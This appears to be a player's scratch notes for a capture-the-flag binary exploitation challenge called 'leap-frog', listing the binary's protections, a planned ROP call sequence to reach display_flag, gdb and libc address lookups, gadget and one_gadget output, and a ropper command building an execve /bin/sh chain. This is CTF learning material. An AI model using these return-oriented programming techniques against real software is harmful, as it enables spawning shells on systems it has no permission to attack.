$ rabin2 -I rop
arch     x86
baddr    0x8048000
canary   false
machine  Intel 80386
nx       true
relocs   true
relro    partial

>>> e = ELF('rop')
[*] '/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


leapA()
leap3_fix()
leap2(0xDEADBEEF)
display_flag()

leapA
   ret
 leap3_fix
   leave
   ret


(gdb) p system
$1 = {<text variable, no debug info>} 0xf7d9bd10 <system>
$1 = {<text variable, no debug info>} 0xf7e16d10 <system>


ropper --file ../frog/rop --chain "execve cmd=/bin/sh"

https://sidsbits.com/Defeating-ASLR-with-a-Leak/

Look at what the `leave` instruction does, and analyze the code and see what
code you could 'reuse' to read data from stdin to a controlled memory
location...

win3 is a local variable for that function. Local variables are stored on the
stack and are loaded into registers before operations. Your goal would be to
change the value of the win3 on the stack


$ rabin2 -S rop
12 0x00000410   176 0x08048410   176 -r-x .plt
13 0x000004c0     8 0x080484c0     8 -r-x .plt.got
22 0x00000ff8     8 0x08049ff8     8 -rw- .got
23 0x00001000    52 0x0804a000    52 -rw- .got.plt

08048460: sym.imp.puts
0804a01c: reloc.puts

$ strace ./rop
openat(AT_FDCWD, "/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3

$ .gem/ruby/2.5.0/bin/one_gadget '/lib32/libc.so.6'
0x13573e execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL


$ ROPgadget --binary '/lib32/libc.so.6' > libc-gadgets.txt
0x00018be5 : pop ebx ; ret
0x00024a67 : pop eax ; ret

$ nm -D /lib32/libc.so.6
00067360 T _IO_puts


b 16 buf
i 4 local
ebx
ebp
caller of vuln

ebp
caller of leapA

i 1 local
ebx
ebp
caller of leap3
